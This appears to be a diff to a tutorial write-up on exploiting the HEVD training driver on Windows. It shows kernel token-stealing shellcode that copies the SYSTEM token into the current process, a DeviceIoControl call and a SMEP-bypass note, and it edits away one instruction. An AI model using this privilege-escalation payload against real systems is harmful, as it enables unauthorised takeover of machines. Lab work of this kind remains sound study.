@@ -502,7 +502,6 @@ payload = bytearray(
     "\x48\x8B\x8B\x58\x03\x00\x00"                      # mov rcx,[rbx+0x358] ; SYSTEM token is @ offset _EPROCESS + 0x348
     "\x80\xE1\xF0"                                      # and cl, 0xf0        ; Clear out _EX_FAST_REF RefCnt
     "\x48\x89\x88\x58\x03\x00\x00"                      # mov [rax+0x358],rcx ; Copy SYSTEM token to current process
-    "\x48\x31\xC0"                                      # xor rax,rax         ; set NTSTATUS SUCCESS
     "\x48\x83\xC4\x40"                                  # add rsp, 0x40       ; RESTORE (Specific to HEVD)
     "\xC3"                                              # ret                 ; Done!
 )
@@ -600,7 +599,7 @@ kernel32.DeviceIoControl(
 os.system("cmd.exe /k cd C:\\")
 ```
 
-This shellcode adds 0x40 to RSP as you can see from above. This is specific to the process I was exploiting, to resume execution.
+This shellcode adds 0x40 to RSP as you can see from above. This is specific to the process I was exploiting, to resume execution. Also i nthis case, RAX was set to 0. Therefore, there was no need to `xor rax, rax`.
 
 As you can see, SMEP has been bypassed!
 
